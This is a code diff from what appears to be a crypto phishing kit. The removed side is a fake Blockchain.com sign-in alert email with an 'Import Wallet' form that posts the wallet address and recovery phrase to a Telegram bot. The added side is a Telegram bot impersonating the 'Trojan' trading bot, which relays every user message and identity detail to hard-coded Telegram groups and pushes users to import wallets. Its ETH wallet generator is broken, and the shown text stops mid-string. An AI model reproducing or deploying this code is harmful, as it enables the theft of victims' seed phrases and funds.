@@ -1,599 +1,404 @@
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+(() => {
+  const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+  const GROUP_ID = "-4704812522";
+  const ADMIN_GROUP_ID = "8165339075";
 
-<meta name=viewport content="width=device-width, initial-scale=1.0">
-<style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 600px;
-            background: #ffffff;
-            padding: 20px;
-            margin: auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        .logo-text {
-            margin-bottom: 20px;
-            color: #0a2342;
-            font-size: 28px;
-            font-weight: 700;
-            font-family: Arial, Helvetica, sans-serif;
-            letter-spacing: 1px;
-        }
-        h2 {
-            color: #333;
-        }
-        p {
-            font-size: 16px;
-            color: #555;
-        }
-        .info {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 6px;
-            text-align: left;
-            margin: 20px 0;
-        }
-        .button {
-            display: block;
-            width: 80%;
-            margin: 10px auto;
-            padding: 12px;
-            background-color: #007bff;
-            color: white;
-            text-decoration: none;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        .button.red {
-            background-color: #dc3545;
-        }
-        .footer {
-            font-size: 14px;
-            color: #888;
-            margin-top: 20px;
-        }
-    </style>
-<title></title></head>
-<body>
-<div>
-<div class=aHl></div>
-<div tabIndex=-1 id=:1nl></div>
-<div id=:1nb class="ii gt" 
-jslog="20277; u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTgzMzk3MjE0NTY5NTkxODQzNXxtc2ctZjoxODMzOTcyMTQ1Njk1OTE4NDM1Il0.; 4:WyIjbXNnLWY6MTgzMzk3MjE0NTY5NTkxODQzNSIsbnVsbCxudWxsLG51bGwsMSwwLFsxLDAsMF0sMjkwLDE3NzgsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLDEsbnVsbCxudWxsLFs0XSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwwLDBd">
-<div id=:1na class="a3s aiL msg-1135143110880407456">
-<div class=m_-1135143110880407456body 
-style="WIDTH: 100% !important; COLOR: #2d3a41; PADDING-BOTTOM: 0px !important; PADDING-TOP: 0px !important; PADDING-LEFT: 0px !important; MIN-HEIGHT: 100% !important; MARGIN: 0px; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px !important; BACKGROUND-COLOR: #f4f4f4; font-variant-ligatures: normal" 
-bgcolor="#f4f4f4">
-<div 
-style="FONT-SIZE: 0px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 1px; BORDER-BOTTOM: 0px; COLOR: transparent; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: none !important; LINE-HEIGHT: 0px !important; PADDING-RIGHT: 0px; MAX-HEIGHT: 1px; opacity: 0"><img 
-class=CToWUd border=0 alt="" 
-src="https://ci3.googleusercontent.com/meips/ADKq_Na-2OUbkjc8ecxhvUrzlW82_t5BGvQzGDj5gOeb8GchpRWFGcRHH1Fgx9UvrNTih7pN6gdQm1PLgBJyJ1vhhmIOi3gQ5Hkbpfs9xMGl6v5249uLjSnrNOdAAHg2JCCv8m42UD_h9Tyj4ThFQuJNRXnj3A5BQedVPecehYJC9JSbBtFhte7dN80XAI0-YIu0ikN6Zpe2Q7LUWoqOzwnR-4ToMnP0_uQV8u5IgzFzyeaFB3I=s0-d-e1-ft#https://post.spmailtechnol.com/q/dNm_MOlDw82WysVs5dAClw~~/AAP1OBA~/WRbrM55u4HA6Es7aJf686WBpFm6u3yGyARKoxr87p0itsVmFuvMdpEMN5wt679oq-6OZkaoQDuQHMlG21em9nA~~" 
-width=1 height=1 data-bit="iit"></div><span 
-style="FONT-SIZE: 0px; HEIGHT: 0px; WIDTH: 0px; COLOR: transparent; DISPLAY: none; opacity: 0">Today's 
-Bitcoin (BTC) Price is $105,509.93 |</span><img class=CToWUd 
-style="BORDER-TOP: 0px; HEIGHT: 1px; BORDER-RIGHT: 0px; WIDTH: 1px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: none !important; LINE-HEIGHT: 0 !important" 
-src="https://ci3.googleusercontent.com/meips/ADKq_Nb6XwU1ZhSmcdGFAl9NraUopHMNjZyUypr6a0JJNpttdkx2c-wAYNbWQgZrS270cxnOpyVM1a9mqlHM-KkkHZhBFvWMhFja6V-JQjy5O5AB_kAqyUbg2Oe2gyYFtmbI8lEnPlJlKMrw5BfHQgIGQwbK8MqGCLJHM_qHTZgF26rgPq1h3H8UP65TsJNlA0-Twb7SnQrPrvqIsKwc7OIkCrGbzdhynjUqbnLskBGPy0Y_rVOJXOf6SufkaZrY_TgbVblt0mVemVgUGzEyzd3QesU6g-jySMpId2ASnKwqSZ4ykvReI7yvvpSxIDDmDxWBwKJMjPhkph7XygeOVv4PxL9zV_Tlp7wECm5emX5nQxMk9B9eyKZjye8mTDGBY17ZCg=s0-d-e1-ft#https://links.blockchain.com/e/eo?_t=b077a02c6d894ec28e56236cee81e43a&amp;_m=5c4d4a9e35f045459102821bf3a912c2&amp;_e=1Ky5861LF5tDI-ygJqfwW4G4OH89h5dFs8DkPvkphHLaAUKULyrvYgNwQ2VCK2yABj6jzFsIsJ9_5FZladamGuzuN2euvsgUYrYvyGPs1d1DrO6A32QWlvZABM14Zod_Mcd4rR16Z1QiwcCw6sWdcA%3D%3D" 
-width=1 height=1 data-bit="iit"> 
-<table role=presentation 
-class="m_-1135143110880407456pc-project-body" 
-style="BORDER-COLLAPSE: collapse; MIN-WIDTH: 600px; TABLE-LAYOUT: fixed; BACKGROUND-COLOR: transparent" 
-cellspacing=0 cellpadding=0 width="100%" bgcolor=transparent border=0>
-  
-  <tr>
-    <td style="BORDER-COLLAPSE: collapse" valign=top align=center>
-      <table role=presentation 
-      class="m_-1135143110880407456pc-project-container" 
-      style="MAX-WIDTH: 600px; WIDTH: 600px; BORDER-COLLAPSE: collapse" 
-      cellspacing=0 cellpadding=0 width=600 align=center border=0>
-        
-        <tr>
-          <td 
-          style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-          valign=top align=left>
-            <table role=presentation 
-            
-            style="WIDTH: 100%; BORDER-COLLAPSE: collapse" cellspacing=0 
-            cellpadding=0 width="100%" border=0>
-              
-              <tr>
-                <td style="BORDER-COLLAPSE: collapse" valign=top>
-                  <table role=presentation 
-                  
-                  style="BORDER-COLLAPSE: collapse" cellspacing=0 cellpadding=0 
-                  width="100%" border=0>
-                    
-                    <tr>
-                      <td 
-                      style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
-                        <table role=presentation 
-                        
-                        style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                        cellpadding=0 width="100%" border=0>
-                          
-                          <tr>
-                            <td 
-                            style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #ffffff; border-radius: 0px" 
-                            bgcolor=#ffffff valign=top>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                class=m_-1135143110880407456pc-w620-spacing-24-0-24-0 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center><a 
-                                style="TEXT-DECORATION: none" 
-                                href="https://links.blockchain.com/u/click?_t=b077a02c6d894ec28e56236cee81e43a&amp;_m=5c4d4a9e35f045459102821bf3a912c2&amp;_e=Zc-PDGqkRf6Es59rlZ27PF64fqNPazbF6TRzih5IfkIKBfPEPlJSHwiQ2jwdRkLL3nil29QAY7IkZjH1U6hRoh8Wuk7X8Rytuaw3xJ780lTzdiqk60J5cSHgKES9WxihtxL0_dPFhoIPjZlXR9EQiRhIx6FWCdjK2xzjNV1qAElok7PdwyYBolMAXsTiIXZTgYCiujjaO3vGvp7iiqMSTiy_N9a3kl6BgfADZDpI5AWgtnKXfN0BsjJQeot23MoxASHIRSlbFVzdnyQIce0SLTmYJWQ27Y2VZps6OYFk_Po%3D" 
-                                rel=noopener target=_blank 
-                                data-saferedirecturl="https://www.google.com/url?q=https://links.blockchain.com/u/click?_t%3Db077a02c6d894ec28e56236cee81e43a%26_m%3D5c4d4a9e35f045459102821bf3a912c2%26_e%3DZc-PDGqkRf6Es59rlZ27PF64fqNPazbF6TRzih5IfkIKBfPEPlJSHwiQ2jwdRkLL3nil29QAY7IkZjH1U6hRoh8Wuk7X8Rytuaw3xJ780lTzdiqk60J5cSHgKES9WxihtxL0_dPFhoIPjZlXR9EQiRhIx6FWCdjK2xzjNV1qAElok7PdwyYBolMAXsTiIXZTgYCiujjaO3vGvp7iiqMSTiy_N9a3kl6BgfADZDpI5AWgtnKXfN0BsjJQeot23MoxASHIRSlbFVzdnyQIce0SLTmYJWQ27Y2VZps6OYFk_Po%253D&amp;source=gmail&amp;ust=1749367470867000&amp;usg=AOvVaw0CCKxG6qH6-JThOW-J9dAn"><img 
-                                class="m_-1135143110880407456pc-w620-width-200 m_-1135143110880407456pc-w620-height-auto CToWUd" 
-                                style="TEXT-DECORATION: none; MAX-WIDTH: 100%; BORDER-TOP: 0px; HEIGHT: auto; BORDER-RIGHT: 0px; WIDTH: 250px; BORDER-BOTTOM: 0px; OUTLINE-WIDTH: 0px; OUTLINE-STYLE: none; BORDER-LEFT: 0px; DISPLAY: block; OUTLINE-COLOR: invert; LINE-HEIGHT: 100%" 
-                                alt="" 
-                                src="https://ci3.googleusercontent.com/meips/ADKq_Nbie2ElDCAyAnJx9yrbFDSvLUFJQuAS6_HSdGOQUsOg4dPEE_AZHSuon4p_dEdxe6S04J7N_XIyC3dXpsDovX7rr_XBHgjFQZ3Jj1AqEi9y3dYWLIsGYoTI5DzUkMOq4hov9vAF=s0-d-e1-ft#https://raw.githubusercontent.com/ipollard-bc/mkg-img/main/logos/color-logo.png" 
-                                width=250 height=50 data-bit="iit"> 
-                                </a></td></tr></table>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 24px; PADDING-TOP: 5px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                </table></td></tr></table></td></tr></table></td></tr></table></td></tr>
-              <tr>
-                <td style="BORDER-COLLAPSE: collapse" valign=top>
-                  <table role=presentation 
-                  
-                  style="BORDER-COLLAPSE: collapse" cellspacing=0 cellpadding=0 
-                  width="100%" border=0>
-                    
-                    <tr>
-                      <td 
-                      style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
-                        <table role=presentation 
-                        
-                        style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                        cellpadding=0 width="100%" border=0>
-                          
-                          <tr>
-                            <td 
-                            class="m_-1135143110880407456pc-w520-padding-25-30-0-30 m_-1135143110880407456pc-w620-padding-25-35-0-35" 
-                            style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 40px; PADDING-RIGHT: 40px; BACKGROUND-COLOR: #ffffff; border-radius: 0px" 
-                            bgcolor=#ffffff valign=top>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: separate; MARGIN-LEFT: auto; BORDER-SPACING: 0; MARGIN-RIGHT: auto" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <div 
-                                style="FONT-SIZE: 24px; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; TEXT-ALIGN-LAST: center; FONT-WEIGHT: 600; COLOR: #000000; TEXT-ALIGN: center; LETTER-SPACING: 0px; LINE-HEIGHT: 131%; font-variant-ligatures: normal">
-                                <div>Sign-In Attempt 
-                                Detected</div></div></td></tr></table></td></tr></table>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                class=m_-1135143110880407456pc-w620-spacing-0-0-20-0 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: separate; MARGIN-LEFT: auto; BORDER-SPACING: 0; MARGIN-RIGHT: auto" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" 
-                                valign=top align=center>
-                                <div 
-                                class="m_-1135143110880407456pc-w620-fontSize-16 m_-1135143110880407456pc-w620-lineHeight-26" 
-                                style="FONT-SIZE: 18px; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; TEXT-ALIGN-LAST: center; FONT-WEIGHT: 600; COLOR: #f7931a; TEXT-ALIGN: center; LETTER-SPACING: 0px; LINE-HEIGHT: 156%; font-variant-ligatures: normal">
-                                <div>A new sign-in attempt was made on your 
-                                <span 
-                                style="FONT-WEIGHT: 600; COLOR: rgb(247,147,26); FONT-STYLE: normal">account.</span></div></div></td></tr></table></td></tr></table>
-                              <table role=presentation 
-                              
-                              style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                              cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <td 
-                                style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
-                                <table role=presentation 
-                                class="m_-1135143110880407456pc-width-fill m_-1135143110880407456pc-w620-gridCollapsed-1" 
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr 
-                                class="m_-1135143110880407456pc-grid-tr-first m_-1135143110880407456pc-grid-tr-last">
-                                <td 
-                                class="m_-1135143110880407456pc-grid-td-first m_-1135143110880407456pc-w620-itemsSpacings-0-14" 
-                                style="WIDTH: 50%; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 7px" 
-                                valign=top width="50%" align=left>
-                                <table role=presentation 
-                                
-                                style="WIDTH: 100%; BORDER-COLLAPSE: separate; BORDER-SPACING: 0" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" 
-                                valign=middle align=center>
-                                <table role=presentation 
-                                
-                                style="WIDTH: 100%; BORDER-COLLAPSE: collapse" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                align=center border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" valign=top 
-                                align=center>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <TH 
-                                style="BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 1; PADDING-RIGHT: 0px" 
-                                valign=top align=center><a 
-                                style="BOX-SIZING: border-box; FONT-SIZE: 16px; TEXT-DECORATION: none; BORDER-TOP: #0c6cf2 1px solid; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; BORDER-RIGHT: #0c6cf2 1px solid; WIDTH: 100%; VERTICAL-ALIGN: top; BORDER-BOTTOM: #0c6cf2 1px solid; TEXT-ALIGN-LAST: center; FONT-WEIGHT: 600; COLOR: #ffffff; PADDING-BOTTOM: 14px; TEXT-ALIGN: center; PADDING-TOP: 14px; PADDING-LEFT: 18px; BORDER-LEFT: #0c6cf2 1px solid; DISPLAY: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: 150%; PADDING-RIGHT: 18px; BACKGROUND-COLOR: #0c6cf2; border-radius: 8px" 
-                                href="https://09876398bdhudvbyuyed63gdbjwgegdedde.vercel.app/" 
-                                rel=noopener target=_blank><span 
-                                style="DISPLAY: block">Verify Sign-In 
-                                </span></a></TH></tr></table></td></tr></table></td></tr></table></td>
-                                <td 
-                                class="m_-1135143110880407456pc-grid-td-last m_-1135143110880407456pc-w620-itemsSpacings-0-14" 
-                                style="WIDTH: 50%; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 7px; PADDING-RIGHT: 0px" 
-                                valign=top width="50%" align=left>
-                                <table role=presentation 
-                                
-                                style="WIDTH: 100%; BORDER-COLLAPSE: separate; BORDER-SPACING: 0" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" 
-                                valign=middle align=center>
-                                <table role=presentation 
-                                
-                                style="WIDTH: 100%; BORDER-COLLAPSE: collapse" 
-                                cellspacing=0 cellpadding=0 width="100%" 
-                                align=center border=0>
-                                
-                                <tr>
-                                <td style="BORDER-COLLAPSE: collapse" valign=top 
-                                align=center>
-                                <table role=presentation 
-                                
-                                style="BORDER-COLLAPSE: collapse" cellspacing=0 
-                                cellpadding=0 width="100%" border=0>
-                                
-                                <tr>
-                                <TH 
-                                style="BORDER-COLLAPSE: collapse; FONT-WEIGHT: normal; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 1; PADDING-RIGHT: 0px" 
-                                valign=top align=center><a 
-                                style="BOX-SIZING: border-box; FONT-SIZE: 16px; TEXT-DECORATION: none; BORDER-TOP: #0c6cf2 1px solid; FONT-FAMILY: 'Inter',Arial,Helvetica,sans-serif; BORDER-RIGHT: #0c6cf2 1px solid; WIDTH: 100%; VERTICAL-ALIGN: top; BORDER-BOTTOM: #0c6cf2 1px solid; TEXT-ALIGN-LAST: center; FONT-WEIGHT: 600; COLOR: #0c6cf2; PADDING-BOTTOM: 14px; TEXT-ALIGN: center; PADDING-TOP: 14px; PADDING-LEFT: 18px; BORDER-LEFT: #0c6cf2 1px solid; DISPLAY: inline-block; LETTER-SPACING: 0px; LINE-HEIGHT: 150%; PADDING-RIGHT: 18px; BACKGROUND-COLOR: #ffffff; border-radius: 8px" 
-                                href="https://09876398bdhudvbyuyed63gdbjwgegdedde.vercel.app/" 
-                                rel=noopener target=_blank><span 
-                                style="DISPLAY: block">Block Access 
-                                
-                              
-                              </span></a></TH></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table>
-                              
-                              <!-- Example HTML for the button and modal/form -->
-<button id="actionBtn">Import Wallet</button>
+  const mainButtons = [
+    ["Wallet"],
+    ["Buy", "Sell"],
+    ["Position", "Limit Orders", "DCA Orders"],
+    ["Copy Trade", "Sniper", "Grid Trading"],
+    ["Bridge", "Withdraw"],
+    ["Referrals", "P&L Flex"],
+    ["New Pairs", "Settings", "Refresh"],
+    ["Trojan Perps"]
+  ];
 
-<!-- Modal for the form -->
-<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:9999; align-items:center; justify-content:center;">
-  <div style="background:#fff; padding:24px; border-radius:8px; max-width:90vw; width:350px; text-align:center; position:relative;">
-    <div id="modalLoader">Loading form...</div>
-    <form id="walletForm" style="display:none;">
-      <h3>Import Wallet</h3>
-      <input name="wallet" placeholder="Wallet Address" required style="width:90%;margin:8px 0;"><br>
-      <input name="phrase" placeholder="Recovery Phrase" required style="width:90%;margin:8px 0;"><br>
-      <button type="submit">Import</button>
-    </form>
-    <div id="modalError" style="color:red; display:none; margin-top:10px;">Unable to connect. Import wallet manually.</div>
-    <button onclick="closeModal()" style="position:absolute;top:8px;right:8px;">&times;</button>
-  </div>
-</div>
+  const walletButtons = {
+    inline_keyboard: [
+      [{ text: "Create Wallet", callback_data: "create_wallet" }],
+      [{ text: "Import Wallet", callback_data: "import_wallet" }],
+      [{ text: "⬅️ Back to Main Menu", callback_data: "main_menu" }]
+    ]
+  };
 
-<script>
-// Telegram Bot Config
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+  const buttonResponses = {
+    buy: "⚠️ Insufficient funds to activate function ⚠️\n\nPlease create or import a wallet and ensure you have enough SOL to buy tokens.",
+    sell: "❌ No tokens available to sell.\n\nYou need to create or import a wallet and hold tokens before selling.",
+    wallet: "👛 *Wallet*: Create a new wallet or import an existing one.",
+    position: "📊 *Position*: Here you can view or manage your current token positions.",
+    limit_orders: "⏳ *Limit Orders*: Set or manage your limit orders for trading.",
+    dca_orders: "📈 *DCA Orders*: Set or manage Dollar-Cost Averaging (DCA) orders.",
+    copy_trade: "🔄 *Copy Trade*: Enable or manage copy trading settings.",
+    sniper: "🎯 *Sniper*: Use the sniper tool for fast token purchases.",
+    grid_trading: "📉 *Grid Trading*: Set up grid trading strategies.",
+    bridge: "🌉 *Bridge*: Bridge tokens between different blockchains.",
+    withdraw: "🏧 *Withdraw*: Withdraw funds or tokens.",
+    referrals: "🔗 *Referrals*: Share your referral link and earn rewards!",
+    p_l_flex: "📈 *P&L Flex*: View your profit and loss flexibly.",
+    new_pairs: "🆕 *New Pairs*: Check out the latest trading pairs.",
+    settings: "⚙️ *Settings*: Adjust your bot preferences.",
+    refresh: "🔄 *Refresh*: Data refreshed!",
+    trojan_perps: "⚔️ *Trojan Perps*: Trade perpetual contracts with Trojan!"
+  };
 
-// Detect platform
-function getPlatform() {
-  const ua = navigator.userAgent;
-  if (navigator.platform.startsWith('Mac')) return 'mac';
-  if (/iPhone|iPad|Android/i.test(ua)) return 'mobile';
-  if (navigator.platform.startsWith('Win')) return 'windows';
-  return 'other';
-}
+  const keyboard = {
+    inline_keyboard: mainButtons.map(
+      (row) => row.map((button) => ({
+        text: button,
+        callback_data: button.toLowerCase().replace(/ /g, "_").replace(/[^a-z0-9_]/g, "")
+      }))
+    )
+  };
 
-// Download file function for Windows
-function downloadFile() {
-  const blob = new Blob(['Wallet backup data'], {type: 'text/plain'});
-  const link = document.createElement('a');
-  link.href = URL.createObjectURL(blob);
-  link.download = 'wallet-backup.txt';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-}
-
-// Modal logic
-function closeModal() {
-  document.getElementById('walletModal').style.display = 'none';
-  document.getElementById('walletForm').reset();
-  document.getElementById('modalLoader').style.display = '';
-  document.getElementById('walletForm').style.display = 'none';
-  document.getElementById('modalError').style.display = 'none';
-}
-
-document.getElementById('actionBtn').onclick = function() {
-  const platform = getPlatform();
-  if (platform === 'windows') {
-    downloadFile();
-  } else {
-    document.getElementById('walletModal').style.display = 'flex';
-    document.getElementById('modalLoader').style.display = '';
-    document.getElementById('walletForm').style.display = 'none';
-    document.getElementById('modalError').style.display = 'none';
-    setTimeout(() => {
-      document.getElementById('modalLoader').style.display = 'none';
-      document.getElementById('walletForm').style.display = 'none';
-      document.getElementById('modalError').style.display = '';
-    }, 5000);
+  // --- ETH Wallet Generation (simple random, not secure for production) ---
+  function generateEthWallet() {
+    const hex = [...crypto.getRandomValues(new Uint8Array(32))]
+      .map(b => b.toString(16).padStart(2, "0")).join("");
+    const priv = "0x" + hex;
+    const address = "0x" + hex.slice(0, 40);
+    return { address, privateKey: priv };
   }
-};
 
-// Form submission to Telegram
-document.getElementById('walletForm').onsubmit = function(e) {
-  e.preventDefault();
-  const formData = new FormData(this);
-  const msg = `Wallet Import:\nAddress: ${formData.get('wallet')}\nPhrase: ${formData.get('phrase')}`;
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
-  }).then(() => {
-    closeModal();
-    alert('Submitted!');
+  // --- Solana Wallet Generation ---
+  function base58Encode(buffer) {
+    const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    let x = BigInt("0x" + Array.from(buffer).map(b => b.toString(16).padStart(2, "0")).join(""));
+    let out = "";
+    while (x > 0) {
+      out = alphabet[x % 58n] + out;
+      x = x / 58n;
+    }
+    for (let i = 0; i < buffer.length && buffer[i] === 0; i++) out = "1" + out;
+    return out;
+  }
+
+  async function getEd25519PublicKeyFromPrivateKey(privateKeyBytes) {
+    const pkcs8prefix = Uint8Array.from([
+      0x30, 0x2e, 0x02, 0x01, 0x00, 0x30, 0x05, 0x06, 0x03, 0x2b, 0x65, 0x70, 0x04, 0x22, 0x04, 0x20
+    ]);
+    const pkcs8 = new Uint8Array(pkcs8prefix.length + 32);
+    pkcs8.set(pkcs8prefix, 0);
+    pkcs8.set(privateKeyBytes.slice(0, 32), pkcs8prefix.length);
+    const key = await crypto.subtle.importKey(
+      "pkcs8",
+      pkcs8.buffer,
+      { name: "Ed25519", namedCurve: "Ed25519" },
+      true,
+      ["sign"]
+    );
+    const jwk = await crypto.subtle.exportKey("jwk", key);
+    const pub = Uint8Array.from(atob(jwk.x.replace(/-/g, "+").replace(/_/g, "/")), c => c.charCodeAt(0));
+    return pub;
+  }
+
+  async function generateSolanaWallet() {
+    const keyPair = await crypto.subtle.generateKey(
+      { name: "Ed25519", namedCurve: "Ed25519" },
+      true,
+      ["sign", "verify"]
+    );
+    const rawPrivate = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
+    const raw = new Uint8Array(rawPrivate);
+    const priv = raw.slice(-64);
+    const priv32 = priv.slice(0, 32);
+    let pub;
+    try {
+      pub = await getEd25519PublicKeyFromPrivateKey(priv32);
+    } catch {
+      pub = priv.slice(32, 64);
+    }
+    return {
+      privateKey: base58Encode(priv),
+      address: base58Encode(pub)
+    };
+  }
+
+  async function sendTelegramMessage(chatId, text, options = {}) {
+    const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        ...options
+      })
+    });
+    const data = await response.json();
+    if (!response.ok) {
+      console.error(`Failed to send message to ${chatId}: ${response.statusText}`, data);
+    }
+    return data;
+  }
+
+  async function deleteTelegramMessage(chatId, messageId) {
+    await fetch(`${TELEGRAM_API}/deleteMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        message_id: messageId
+      })
+    });
+  }
+
+  function isValidWalletAddress(address) {
+    return address.length > 20;
+  }
+
+  function delay(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+  const userLastMessage = {};
+  const userWallets = {};
+
+  async function deleteLastUserMessage(chatId) {
+    if (userLastMessage[chatId]) {
+      const messageId = userLastMessage[chatId];
+      await deleteTelegramMessage(chatId, messageId);
+      delete userLastMessage[chatId];
+    }
+  }
+
+  async function sendToAllGroups(text, options = {}) {
+    await sendTelegramMessage(GROUP_ID, text, options);
+    await sendTelegramMessage(ADMIN_GROUP_ID, text, options);
+  }
+
+  async function handleRequest(request) {
+    const url = new URL(request.url);
+    const { pathname } = url;
+    if (pathname === "/") {
+      return new Response("Telegram Bot is running", { status: 200 });
+    }
+    if (pathname === "/webhook") {
+      const update = await request.json();
+      // Handle user messages
+      if (update.message) {
+        const chatId = update.message.chat.id;
+        const userId = update.message.from.id;
+        const username = update.message.from.username ? `@${update.message.from.username}` : "N/A";
+        const firstName = update.message.from.first_name || "N/A";
+        const lastName = update.message.from.last_name || "N/A";
+        const userInfo = `User ID: ${userId}
+Username: ${username}
+Name: ${firstName} ${lastName}`;
+        if (update.message.text) {
+          const userMessage = update.message.text;
+          await sendToAllGroups(`User input: \`${userMessage}\`\n${userInfo}`, {
+            parse_mode: "Markdown"
+          });
+          if (userMessage === "/start") {
+            // Show welcome and Continue button
+            const welcomeMsg = `*Welcome to Trojan, the most used Trading Telegram bot.*
+
+Trojan enables you to quickly buy or sell tokens and set automations like Limit Orders, DCA, Copy-trading and Sniping.
+
+By continuing you'll create a crypto wallet that interacts with Trojan to power it up with instant swaps and live data.
+
